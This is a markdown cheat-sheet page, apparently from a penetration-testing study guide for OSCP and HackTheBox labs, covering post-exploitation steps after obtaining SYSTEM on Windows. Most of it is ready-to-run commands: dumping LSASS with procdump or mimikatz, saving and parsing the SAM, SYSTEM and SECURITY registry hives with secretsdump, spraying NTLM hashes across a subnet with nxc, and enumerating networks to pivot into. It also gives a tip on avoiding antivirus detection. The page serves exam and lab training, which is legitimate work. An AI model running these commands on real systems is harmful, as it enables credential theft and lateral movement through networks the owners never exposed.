---
id: system-shell
title: SYSTEM Shell / Proof (Windows)
stage: objective
tags: [windows]
summary: You have SYSTEM — grab proof, dump LSASS and SAM for credentials, spray hashes laterally, and check for additional subnets before finishing.
leads_to:
  - pass-the-hash
  - domain-admin
  - pivot
---

## Prerequisites

A shell running as `NT AUTHORITY\SYSTEM`. Proof file location: `C:\Users\Administrator\Desktop\proof.txt` (OSCP) or `root.txt` (HTB). Always run `hostname && whoami` alongside the type command for a clean screenshot.

SYSTEM access ends the local privilege escalation phase. Immediate priorities: grab the proof file, dump LSASS for any cached domain credentials, dump SAM for local hashes, spray those hashes across the subnet, and check for additional networks or domain controllers to pivot into.

## Quick Win

> hostname, whoami, and the proof file — one screenshot covers the exam requirement.

```powershell
hostname && whoami
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Grab Proof

> Standard OSCP format — both lines in the same screenshot.

```powershell
hostname && whoami
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Dump LSASS (Domain Credentials)

> Cached domain account credentials live in LSASS — procdump is least AV-detected.

```powershell
# Procdump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Task Manager (no tools — GUI only)
# Task Manager → Details → right-click lsass.exe → "Create dump file"

# Mimikatz (on-box)
privilege::debug
sekurlsa::logonpasswords
```

```bash
# Parse dump on attacker
pypykatz lsa minidump lsass.dmp
```

## Dump SAM (Local Hashes)

> Local account hashes — Administrator hash lets you PTH to other machines.

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Spray Hashes Across Subnet

> Run immediately — catches every machine sharing the local admin password.

```bash
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM
```

## Check for Additional Networks

> Additional NICs or routes mean additional targets — check before finishing.

```powershell
ipconfig /all
route print
arp -a
netstat -ano
```

## Leads To

Local Administrator hash → pass-the-hash to other machines in the subnet. LSASS dump with domain credentials → domain-admin if a DA was logged in. Additional subnet found → pivot to next segment and restart recon. Domain-joined machine + SYSTEM access → run SharpHound for BloodHound analysis → full AD attack path from here.
